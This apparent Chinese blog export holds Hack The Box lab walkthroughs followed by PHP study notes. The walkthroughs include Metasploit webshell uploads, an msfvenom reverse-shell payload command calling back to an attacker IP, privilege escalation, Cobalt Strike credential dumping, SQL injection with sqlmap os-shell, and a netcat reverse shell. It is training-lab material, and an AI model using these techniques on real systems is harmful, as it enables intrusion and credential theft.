<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302105837375.png" alt="image-20210302105837375"></p>
<h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><p>有多种方式getshell，比如说</p>
<ul>
<li><p>插件</p>
<ul>
<li>  Wordpress 支持自定义插件</li>
<li>  msf存在模块 <code>exploit/unix/webapp/wp_admin_shell_upload</code>，可以直接利用插件。</li>
</ul>
</li>
<li><p>修改源码</p>
<ul>
<li><p>在外观-&gt;编辑器处可以修改php源码，直接留webshell，在这个站我测试的时候留了一句话木马，结果出现了问题。</p>
<p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302130127180.png" alt="image-20210302130127180"></p>
<p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302130815893.png" alt="image-20210302130815893"></p>
<p>  总之就是不太行。</p>
</li>
</ul>
</li>
</ul>
<p>所以还是msf好用，如下设置参数：</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302131005569.png" alt="image-20210302131005569"></p>
<p><font color='red'>上面的lhost应该写入自己的ip，不能用0.0.0.0，会出错，懒得改了，就这样了</font></p>
<p>得到一个shell，并上传一句话木马</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302131326846.png" alt="image-20210302131326846"></p>
<p>使用蚁剑连接</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302131514532.png" alt="image-20210302131514532"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>Windows的提权可以使用msf下的一个模块<code>post/multi/recon/local_exploit_suggester</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302131618990.png" alt="image-20210302131618990"></p>
<p>但是这个必须要一个Windows的<code>meterpreter session</code>，用</p>
<p><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.88 LPORT=8848 -f exe &gt; msf_x64.exe</code></p>
<p>生成一个payload，上传到服务器上，msf打开<code>handler</code>，执行木马，得到一个会话</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302132104042.png" alt="image-20210302132104042"></p>
<p>使用<code>suggester</code></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302133113265.png" alt="image-20210302133113265"></p>
<p>说可以用<code>ms16_075</code>提权</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302133253493.png" alt="image-20210302133253493"></p>
<p>结果却失败了，但是确实说了是<strong>vulnerable</strong>，所以应该是参数不对</p>
<p>这里有个参数是<code>clsid</code></p>
<blockquote>
<p>  <a href="https://blog.csdn.net/wmnmtm/article/details/82922028">https://blog.csdn.net/wmnmtm/article/details/82922028</a></p>
</blockquote>
<p><font color='red'>目前还不知道在<code>ms16_075</code>中这个id是干啥的，找不到相关资料。盲猜是写入了特定的id，改变了权限</font></p>
<p>网上找了一下其他的<code>clsid</code></p>
<blockquote>
<p>   <a href="https://www.cnblogs.com/hookjoy/p/12460089.html">https://www.cnblogs.com/hookjoy/p/12460089.html</a></p>
</blockquote>
<p>目标系统是<strong>windows 2016</strong></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302133833707.png" alt="image-20210302133833707"></p>
<p>选了 **{42C21DF5-FB58-4102-90E9-96A213DC7CE8}**，再次<code>exploit</code>，成功</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302134011551.png" alt="image-20210302134011551"></p>
<p>flag：<img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302134131022.png" alt="image-20210302134131022"></p>
<h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>后来翻了翻wp，发现最后有一步导出密码的操作，在下一个机子有用，那就顺便学习一下cs</p>
<p>上传cs_x64的马，system上线</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302134509016.png" alt="image-20210302134509016"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">beacon&gt;</span><span class="bash"> sleep 1</span></span><br><span class="line">[*] Tasked beacon to sleep for 1s</span><br><span class="line"><span class="meta">beacon&gt;</span><span class="bash"> shell whoami</span></span><br><span class="line">[*] Tasked beacon to run: whoami</span><br><span class="line">[+] host called home, sent: 53 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>

<p>用 <a href="https://github.com/pandasec888/taowu-cobalt-strike">梼杌</a>插件的凭证获取</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302134832578.png" alt="image-20210302134832578"></p>
<p>导出用户<strong>sandra</strong>的密码 <strong>Password1234!**，域名：</strong>MEGACORP.LOCAL**</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302134943182.png" alt="image-20210302134943182"></p>
<p>直接使用<code>net time /domain</code>去请求域会失败，猜测可能是没有接入域吧。</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302135113724.png" alt="image-20210302135113724"></p>
<h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>Windows提权的手段又多了一点，知识面慢慢打开。</p>
<p>脚本小子初养成。</p>
]]></content>
      <categories>
        <category>exploit</category>
        <category>hack the box</category>
        <category>start point</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>exploit</tag>
        <tag>hack the box</tag>
      </tags>
  </entry>
  <entry>
    <title>box:Vaccine</title>
    <url>//box_Vaccine.html</url>
    <content><![CDATA[<p>从零开始的hack_the_box 生活</p>
<a id="more"></a>

<h1 id="Vaccine"><a href="#Vaccine" class="headerlink" title="Vaccine"></a>Vaccine</h1><ul>
<li>  靶机： <code>10.10.10.46</code></li>
<li>  攻击机：<code>10.10.14.88</code></li>
</ul>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">└─# nmap 10.10.10.46 -A                                                                                                                                                    1 ⚙</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-01 20:46 EST</span><br><span class="line">Nmap scan report for 10.10.10.46</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line">Not shown: 977 closed ports</span><br><span class="line">PORT      STATE    SERVICE       VERSION</span><br><span class="line">21/tcp    open     ftp           vsftpd 3.0.3</span><br><span class="line">22/tcp    open     ssh           OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)</span><br><span class="line">|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)</span><br><span class="line">|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)</span><br><span class="line">80/tcp    open     http          Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: MegaCorp Login</span><br></pre></td></tr></table></figure>

<p>老样子，遇到ftp和ssh先爆破一波，web服务访问也是登录，也爆破</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302095757633.png" alt="image-20210302095757633"></p>
<p>一顿操作猛如虎，一看，啥都没有。</p>
<p>结果ftp的密码居然是上一道题<code>/root/.config/filezilla</code>下的<code>filezilla.xml</code></p>
<p><code>ftpuser/mc@F1l3ZilL4</code>吐了</p>
<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>登录上去发现backup.zip</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302095011014.png" alt="image-20210302095011014"></p>
<p>下载下来，解压需要密码</p>
<p>使用<code>fcrackzip</code>爆破密码，<a href="https://blog.csdn.net/weixin_43272781/article/details/100751375">参数和使用教程</a></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302095159837.png" alt="image-20210302095159837"></p>
<p>解压后得到<code>index.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) === <span class="string">&quot;2cb42f8734ea607eefed3b70af13bbd3&quot;</span>) &#123;</span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">      header(<span class="string">&quot;Location: dashboard.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>破解一下hash</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302095706364.png" alt="image-20210302095706364"></p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>得到了用户名和密码之后就可以登录了，登录之后有一个搜索框，这回总是sql注入了吧</p>
<p>果不其然，直接堆叠注入。</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302095959505.png" alt="image-20210302095959505"></p>
<p>看一下版本</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">version</span>();</span><br><span class="line">PostgreSQL 11.5 (Ubuntu 11.5-1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.1.0-9ubuntu2) 9.1.0, 64-bit</span><br></pre></td></tr></table></figure>

<p>这数据库没有注过啊。</p>
<ul>
<li><p>sqlmap。 –os-shell</p>
<p>  居然能用</p>
<p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302102217607.png" alt="image-20210302102217607"></p>
<p>  传过去一个nc，连上反弹shell</p>
<p>  ![image-20210302102920598](/Users/shirohaethu/Library/Application Support/typora-user-images/image-20210302102920598.png)</p>
<p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302102938607.png" alt="image-20210302102938607"></p>
</li>
</ul>
<p>user.txt</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302103249535.png" alt="image-20210302103249535"></p>
<ul>
<li>  万能的百度</li>
</ul>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302100939553.png" alt="image-20210302100939553"></p>
<p>文件读取</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302101000333.png" alt="image-20210302101000333"></p>
<p>文件写失败了。。。</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在<code>/var/www/html/dashboard.php</code>中，有当前用户<code>postgres</code>的密码</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302103407792.png" alt="image-20210302103407792"></p>
<p>ssh建立连接</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302103509012.png" alt="image-20210302103509012"></p>
<p><code>sudo -l</code>发现可以免密运行<code>/bin/vi /etc/postgresql/11/main/pg_hba.conf</code>，vi 是可以得到一个<code>/bin/bash</code>的</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302103649670.png" alt="image-20210302103649670"></p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302103724396.png" alt="image-20210302103724396"></p>
<p>得到root权限</p>
<p>flag:</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302103748836.png" alt="image-20210302103748836"></p>
]]></content>
      <categories>
        <category>exploit</category>
        <category>hack the box</category>
        <category>start point</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>hack the box</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集的一些姿势</title>
    <url>//information.html</url>
    <content><![CDATA[<p>记录一下目前用到的某些小工具（不全，慢慢补，不急）</p>
<a id="more"></a>

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><ul>
<li>  <a href="https://securitytrails.com/">https://securitytrails.com/</a></li>
</ul>
<h2 id="钟馗之眼"><a href="#钟馗之眼" class="headerlink" title="钟馗之眼"></a>钟馗之眼</h2><p><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p>
<h2 id="censys"><a href="#censys" class="headerlink" title="censys"></a>censys</h2><p><a href="https://censys.io/">https://censys.io/</a></p>
<h2 id="ip历史解析"><a href="#ip历史解析" class="headerlink" title="ip历史解析"></a>ip历史解析</h2><ul>
<li>  ip查询：<a href="https://ipchaxun.com/">https://ipchaxun.com/</a></li>
</ul>
]]></content>
      <categories>
        <category>exploit</category>
      </categories>
      <tags>
        <tag>exploit</tag>
      </tags>
  </entry>
  <entry>
    <title>php伪协议</title>
    <url>//php_agreement.html</url>
    <content><![CDATA[<p>（还没有开始写）</p>
<p>参考资料: <a href="https://segmentfault.com/a/1190000018991087">php伪协议总结</a></p>
<a id="more"></a>

]]></content>
      <categories>
        <category>web</category>
        <category>php</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>php中的文件包含</title>
    <url>//php_fileinclude.html</url>
    <content><![CDATA[<p>php文件包含</p>
<p>参见<a href="https://www.php.net/manual/zh/reserved.variables.php">php手册</a></p>
<a id="more"></a>



<h2 id="include"><a href="#include" class="headerlink" title="include"></a>include</h2><h3 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h3><h4 id="1-php"><a href="#1-php" class="headerlink" title="1.php"></a>1.php</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello wolrd&lt;br/&gt;&quot;</span>	<span class="comment">// 漏了; 是错误的语法</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;h&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="2-php"><a href="#2-php" class="headerlink" title="2.php"></a>2.php</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include</span> <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line">	<span class="keyword">include</span> <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行<code>2.php</code>的时候，会在<code>include</code>语句处去找相应的文件，将其加载到<code>include</code>语句处，即使<code>1.php</code>包含语法错误，也会执行上面的代码，遇到<code>1.php</code>中的语法错误就终止</p>
<h3 id="include-1"><a href="#include-1" class="headerlink" title="include"></a>include</h3><p>对于<code>include</code>，系统碰到一次就会运行一次，如果对同一个文件多次使用<code>include</code>，也会加载多次</p>
<h3 id="include-once"><a href="#include-once" class="headerlink" title="include_once"></a>include_once</h3><p>对于<code>include_once</code>，就算碰到了多次，也只会运行一次，个人认为如果用C语言来类比的话，就像是在头文件中写入了如下语句</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __xxx_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __xxx_H__</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// __xxx_H__</span></span></span><br></pre></td></tr></table></figure>



<h2 id="require"><a href="#require" class="headerlink" title="require"></a>require</h2><h3 id="require和include的区别"><a href="#require和include的区别" class="headerlink" title="require和include的区别"></a><code>require</code>和<code>include</code>的区别</h3><ul>
<li><p>加载失败的处理方式不同</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// include &#x27;1.php&#x27;;</span></span><br><span class="line">	<span class="comment">// require &#x27;1.php&#x27;;</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;hello world&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>  如果<code>1.php</code>不存在</p>
<ul>
<li><code>include</code>要求较低，包含出错不影响继续执行；</li>
<li><code>require</code>要求较高，包含出错代码将不会继续执行</li>
</ul>
</li>
<li><p><code>include</code>是有条件包含，<code>require</code>是无条件包含</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">require</span> <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>include &#39;1.php&#39;</code>将不会被运行</li>
<li><code>require &#39;1.php&#39;</code>将会被运行</li>
</ul>
</li>
<li><p><code>require</code>没有返回值，而<code>include</code>有</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">include</span> <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$ret</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;failed&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>require</code>是预先替代，是先将指定文件的内容替换出来再运行</p>
</li>
</ul>
<h2 id="文件嵌套包含"><a href="#文件嵌套包含" class="headerlink" title="文件嵌套包含"></a>文件嵌套包含</h2><p>本质就是套娃</p>
<h3 id="示例程序-1"><a href="#示例程序-1" class="headerlink" title="示例程序"></a>示例程序</h3><h4 id="1-php-1"><a href="#1-php-1" class="headerlink" title="1.php"></a>1.php</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="2-php-1"><a href="#2-php-1" class="headerlink" title="2.php"></a>2.php</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;world&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="3-php"><a href="#3-php" class="headerlink" title="3.php"></a>3.php</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">&#x27;2.php&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;done&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>在执行<code>3.php</code>的时候，会包含<code>2.php</code>，又会继续包含<code>1.php</code>，造成套娃操作</p>
<blockquote>
<p>那么问题来了，如果构成了循环的嵌套包含会怎么样</p>
</blockquote>
]]></content>
      <categories>
        <category>web</category>
        <category>php</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>php中的系统常量</title>
    <url>//php_systemVar.html</url>
    <content><![CDATA[<p>php中的常量</p>
<p>参见<a href="https://www.php.net/manual/zh/reserved.variables.php">php手册</a></p>
<a id="more"></a>



<h3 id="系统常量"><a href="#系统常量" class="headerlink" title="系统常量"></a>系统常量</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP_VERSION:		<span class="comment">// php的版本号</span></span><br><span class="line">PHP_INT_SIZE:		<span class="comment">// 整型的大小</span></span><br><span class="line">PHP_INT_MAX:		<span class="comment">// 整型能表示的最大值</span></span><br><span class="line">PHP_OS 				<span class="comment">// 当前PHP环境的运行操作系统</span></span><br><span class="line">M_PI 				<span class="comment">// 圆周率常量值</span></span><br><span class="line">M_E 				<span class="comment">// 科学常数e</span></span><br><span class="line">E_ERROR 			<span class="comment">// 最近的错误之处</span></span><br><span class="line">E_WARNING 			<span class="comment">// 最近的警告之处</span></span><br><span class="line">E_PARSE 			<span class="comment">// 剖析语法有潜在问题之处</span></span><br></pre></td></tr></table></figure>



<h3 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h3><p>魔术常量是会根据环境的变化而发生变化的变量</p>
<p>由<code>__xxx__</code>形式构成</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">__FILE__</span> 		<span class="comment">// 当前PHP文件的绝对路径路径(会带上文件名)</span></span><br><span class="line"><span class="keyword">__DIR__</span>			<span class="comment">// 当前文件的目录(绝对路径)</span></span><br><span class="line"><span class="keyword">__LINE__</span> 		<span class="comment">// 当前PHP文件中所在的行号</span></span><br><span class="line"><span class="keyword">__FUNCTION__</span> 	<span class="comment">// 当前函数名，只对函数内调用起作用</span></span><br><span class="line"><span class="keyword">__CLASS__</span> 		<span class="comment">// 当前类名，只对类起作用</span></span><br><span class="line"><span class="keyword">__NAMESPACE__</span>	<span class="comment">// 当前所属的命名空间</span></span><br><span class="line"><span class="keyword">__METHOD__</span> 		<span class="comment">// 表示类方法名，比如B::test</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>web</category>
        <category>php</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>php中的预定义变量</title>
    <url>//php_predefine.html</url>
    <content><![CDATA[<p>php中的预定义变量</p>
<p>参见<a href="https://www.php.net/manual/zh/reserved.variables.php">php手册</a></p>
<a id="more"></a>



<h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>:		<span class="comment">// 以get方式提交的数据</span></span><br><span class="line"><span class="variable">$_POST</span>:		<span class="comment">// 以post方式提交的数据</span></span><br><span class="line"><span class="variable">$_REQUEST</span>:	<span class="comment">// get和post提交的数据</span></span><br><span class="line"><span class="variable">$GLOBALS</span>:	<span class="comment">// php中的全局变量</span></span><br><span class="line"><span class="variable">$_SERVER</span>:	<span class="comment">// 服务器信息</span></span><br><span class="line"><span class="variable">$_SESSION</span>:  <span class="comment">// session会话数据</span></span><br><span class="line"><span class="variable">$_COOKIE</span>:	<span class="comment">// cookie 会话数据</span></span><br><span class="line"><span class="variable">$_ENV</span>:		<span class="comment">// 环境信息</span></span><br><span class="line"><span class="variable">$_FILES</span>:	<span class="comment">// 用户上传的文件信息</span></span><br><span class="line"><span class="variable">$php_errormsg</span></span><br></pre></td></tr></table></figure>



<h3 id="GET"><a href="#GET" class="headerlink" title="$_GET"></a>$_GET</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$var1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$var1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>当访问<code>xx.php?cmd=1</code>时，会显示<code>1</code>    </p>
<h4 id="POST"><a href="#POST" class="headerlink" title="$_POST"></a>$_POST</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$var1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$var1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>当以<code>post</code>方式发送<code>cmd=1</code>时，会显示<code>1</code></p>
<h3 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$var1</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$var1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>当收到一个<code>name</code>变量(不论<code>get</code>还是<code>post</code>)</p>
<h3 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];	<span class="comment">// 用户的 IP 地址</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADDR&#x27;</span>];	<span class="comment">// 服务器的 IP 地址</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_NAME&#x27;</span>];	<span class="comment">// 服务器的主机名</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>];	<span class="comment">// 脚本所在的文档根目录。在服务器配置文件中定义。</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>];		<span class="comment">// 获取当前网页地址（不含域名部分）</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];	<span class="comment">// 获取当前网页地址中的所有get数据，但只是一个整体的字符串而已</span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>];<span class="comment">// 脚本的绝对路径 </span></span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_TIME&#x27;</span>]	<span class="comment">// 在PHP 5.1之后加入，保存了发送请求的时间戳</span></span><br></pre></td></tr></table></figure>



<h3 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$_GLOBALS"></a>$_GLOBALS</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$var1</span> = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$var1</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$GLOBALS</span>[<span class="string">&#x27;var1&#x27;</span>];</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个变量主要是用于</p>
<p>​    在局部范围不可以使用全局变量的时候有需要使用该变量的值，此时就可以用它来取得该全局变量的值。</p>
]]></content>
      <categories>
        <category>web</category>
        <category>php</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>Upload-Labs</title>
    <url>//Upload-Labs.html</url>
    <content><![CDATA[<p><code>Upload-labs</code>的记录</p>
<a id="more"></a>

<h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>使用docker直接搭建环境</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130141102104.png" alt="image-20201130141102104"></p>
<p>启动docker之后，需要在<code>/var/www/html</code>目录下新建一个<code>upload</code>文件夹，并且将所有权给<code>www-data</code></p>
<h2 id="pass01"><a href="#pass01" class="headerlink" title="pass01"></a>pass01</h2><h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">   